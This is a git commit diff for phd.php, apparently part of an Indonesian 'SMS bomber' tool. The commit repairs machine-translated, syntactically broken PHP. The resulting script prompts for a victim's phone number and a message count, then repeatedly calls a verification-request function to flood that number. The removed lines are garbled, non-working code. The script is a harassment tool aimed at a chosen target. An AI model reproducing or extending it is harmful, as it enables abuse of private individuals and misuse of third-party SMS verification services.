8af8ea5ec627506ffd6ecb85921e90f260df91c1
MGM3199 <48875764+MGM3199@users.noreply.github.com>
2019-10-20 00:05:51 +0700

    Update phd.php

--- phd.php
+++ phd.php
@@ -1,18 +1,21 @@
-<? php
-termasuk  ' bomphd.php ' ;
-/ *
+<?php
+include 'bomphd.php';
+
+/*
     https://github.com/nee48/BomSmsPhD
-    Dibuat oleh Handika Pratama
-    Dimodifikasi oleh ま や ち ゃ ん
-* /
-$ init  =  Bom baru  ();
-// Eksekusi Sms Boomber
-echo  " Nomor Target (tanpa 0/62) \ n Input: " ;
-$ a  =  trim ( fgets ( STDIN ));
-$ init -> no  =  " $ a " ;
-echo  " Jumlah Pesan \ n Input: " ;
-$ b  =  trim ( fgets ( STDIN ));
-$ loop  =  " $ b " ;
-untuk ( $ i = 0 ; $ i  <  $ loop ; $ i ++ ) {
-    $ init -> Verif ( $ init -> no );
+    Made by Handika Pratama
+    Modified by まやちゃん
+*/
+
+$init = new Bom();
+
+//Eksekusi Sms Boomber
+echo "Nomor Target (tanpa 0/62)\nInput : ";
+$a = trim(fgets(STDIN));
+$init->no = "$a";
+echo "Jumlah Pesan\nInput : ";
+$b = trim(fgets(STDIN));
+$loop = "$b";
+for ($i=0; $i < $loop; $i++) {
+    $init->Verif($init->no);
 }
